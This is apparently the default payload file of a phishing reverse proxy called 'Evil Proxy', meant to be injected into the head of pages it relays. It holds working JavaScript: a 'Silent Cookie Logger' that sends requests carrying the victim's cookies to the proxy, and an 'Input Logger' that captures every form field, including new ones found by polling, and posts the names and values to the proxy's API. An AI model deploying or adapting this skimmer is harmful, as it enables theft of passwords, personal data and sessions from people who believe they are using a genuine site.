/*
REMEMBER! 
This file is run in the head tag, so make sure that your payloads are run after the body has loaded, if necessary.
*/

alert('This is the default Evil Proxy payload. To edit, remove or add a payload, go to the proxy directory, and configure them from the payloads folder as you wish.')

/* Silent Cookie Logger (DEFAULT) */
document.addEventListener("DOMContentLoaded", function() {
    fetch('/ep/api/ping', { method: 'POST', credentials: 'include' });
});

/* Input Logger (DEFAULT) */
document.addEventListener("DOMContentLoaded", () => {
    const sendData = (name, value) => {
        fetch('/ep/api/science', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ [name]: value })
        });
    };

    const logFieldValue = (el) => {
        const fieldName = el.name;
        if (fieldName) {
            console.log(`Logging field: ${fieldName}, Value: ${el.value}`);
            sendData(fieldName, el.value);
        }
    };

    const attachListeners = (el) => {
        el.addEventListener('change', () => logFieldValue(el));
        el.addEventListener('blur', () => logFieldValue(el));
        el.addEventListener('keydown', (e) => {
            if (e.key === 'Enter') logFieldValue(el);
        });
    };

    const initializeLogging = () => {
        document.querySelectorAll('input, select, textarea').forEach(el => {
            if (el.name) attachListeners(el);
        });
    };

    initializeLogging();

    const checkForNewFields = () => {
        document.querySelectorAll('input, select, textarea').forEach(el => {
            if (el.name && !el.dataset.logged) {
                attachListeners(el);
                el.dataset.logged = 'true';
            }
        });
    };

    setInterval(checkForNewFields, 500);

    document.querySelectorAll('button').forEach(button => {
        button.addEventListener('click', () => {
            const activeElement = document.activeElement;
            if (['INPUT', 'TEXTAREA', 'SELECT'].includes(activeElement.tagName)) {
                logFieldValue(activeElement);
            }
        });
    });
});